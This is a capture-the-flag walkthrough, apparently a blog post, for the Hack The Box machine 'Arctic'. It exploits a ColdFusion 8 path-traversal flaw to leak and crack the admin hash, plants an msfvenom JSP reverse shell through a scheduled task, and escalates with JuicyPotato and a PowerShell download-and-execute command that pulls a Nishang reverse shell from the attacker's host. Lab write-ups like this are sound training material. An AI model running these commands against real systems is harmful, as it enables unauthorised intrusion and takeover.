## Enumeration

Nmap shows 3 open ports; 2 Windows RPC ports, and port 8500, with an unknown service running.

```

```

If we try to pull up port 8500 in a web browser, we're directed to a directory listing, giving links for `/cfdocs` and `/cfide`. So we definetly have a web server of some kind running.

> Oddly enough, gobuster doesn't play well with this server, even after increasing the timeout to over 60s. Slowness of the machine also shows in loading webpages. I'm not sure if this is by design to go with the *Arctic* theme, or just the results of an older, underpowered machine.

If we click on `/cfide`, we get another directory listing, as below.

From these selections, `/administrator` looks the most interesting. This brings us to a ColdFusion 8 Administrator login. Note that the username field is hardcoded with `admin`.

## Initial Shell

### LFI in password field

In doing some online searching, [this post](https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html) pointed to towards a known vulnerability in CF8 ([APSB10-18](https://www.adobe.com/support/security/bulletins/apsb10-18.html)), where we can extract the password hash from the internal `password.properties` file. The example given for the LFI would be something like the URL below.

```
http://[HOSTNAME:PORT]</span>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en
```

In our situation, the URL would be something like below. Note that I had to change the direction of the `/` to make it work for some reason.

```
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

As we can see below, the password hash of `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03` is dumped onscreen for us.

![](/assets/htb-arctic/cfadmin_hashdump.png)

When we feed the hash to Kali's `hashid` tool, we see that it's most likely a SHA-1 hash, which can easily be cracked via `hashcat`.

![](/assets/htb-arctic/hashid_sha1.png)

The below command will run the hash through `hashcat`, to a resulting password of `happyday`.

```
hashcat -m 100 loot/cfadmin.hash ~/wordlists/rockyou.txt --force
```

![](/assets/htb-arctic/cfadmin_hash_cracked.png)

Logging into the CFAdmin portal with the cracked password verifies it.

### Create scheduled tasks

Once we're in the admin panel, we can navigate to the section labeled *Dubugging & Logging > Scheduled Tasks*. The resulting page is below.

![](/assets/htb-arctic/cf_schedualed_tasks.png)

As you can see, it appears to try to pull form the URL we specify at the interval we set. By default, ColdFusion runs `*.cfm` extensions, but will also run JSP files. We can create a malicious JSP file with `msfvenom`, using the below code.

```
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.34 lport=7500 -f raw > shell.jsp
```

Now all that we have to do is stand up a HTTP server with `updog` to serve the file, and open a listener for the shell with `rlwrap nc -lvnp 7500`.

> If you haven't already, check out the [Updog repo on GitHub](https://github.com/sc0tfree/updog). I find it much easier then using the Python modules as normal.

Fill out the Scheduled Tasks form, with the URL pointing to `http://10.10.14.34:9090/shell.jsp`. However, we need to write the file to the server, but we need to know the exact folder path where documents are being served from.

Under *Server Settings > Mappings*, you can see that `CFIDE` is being served from `C:\ColdFusion8\wwwroot\CFIDE`. So if we tell the scheduled task to write `shell.jsp` to `C:\ColdFusion8\wwwroot\CFIDE`, we should be able to trigger the exploit by navigating to `http://10.10.10.11:8500/CFIDE/shell.jsp`.

![](/assets/htb-arctic/server_mappings.png)

Finish out the creation of the scheduled task. Note that the time set doesn't matter, as we can run the task manually.

![](/assets/htb-arctic/tasks_create.png)

Once saved, you'll see the task in the list. The green button on the left will run the task manually.

![](/assets/htb-arctic/tasks_set.png)

All that's left to do is manually run the task, and visit the URL to trigger the exploit.

You can read `user.txt` from `C:\users\tolis\user.txt`

## Privilege Escalation

### JuicyPotato

Now that we have a shell, we can look into escalating to the `Administrator` or `NT AUTHORITY\SYSTEM` account.

First thing we should do is run `systeminfo`, which gives us a ton of useful info.

```

As you can see above, this is a 64-bit Server 2008 R2 system, with no hotfixes applied. This means we can pretty much pick any privilege escalation exploit for 2008 R2, and it should work. When we check the output of `whoami /all`, we get the below results.

I've been using [JuicyPotato](https://ohpe.it/juicy-potato/) a lot lately, and I'll stick with it here, since the needed privilege is enabled. The process for JuicyPotato is as follows below. A more detailed breakdown can be found in some of my other recent Windows walkthroughs like [Bastard](https://dm7500.github.io/oscp-prep/2020-02-28-HTB-Bastard/) or [Bounty](https://dm7500.github.io/oscp-prep/2020-02-11-HTB-Bounty/).

#### JuicyPotato steps

1. Copy the executable for JP to our working directory with `cp /opt/JuicyPotato.exe jp.exe`.
2. Copy the Nishang Invoke-PowerShellTcp.ps1 reverse shell script to our working directory with `cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 revshell.ps1`
   1. Edit the `revshell.ps1` file to include `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.34 -Port 7600` on a new line at the end of the file.
3. Stand up a SMB server with `sudo impacket-smbserver kali .`
4. Copy the `jp.exe` file to the target with `copy \\10.10.14.34\kali\jp.exe .`.
5. Open a listener for the new reverse shell with `rlwrap nc -lvnp 7600`
6. On the target, run `jp.exe -t * -p C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -l 9001 -a "-c IEX(new-object net.webclient).downloadstring('http://10.10.14.34:9090/revshell.ps1')" -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` to trigger the exploit.
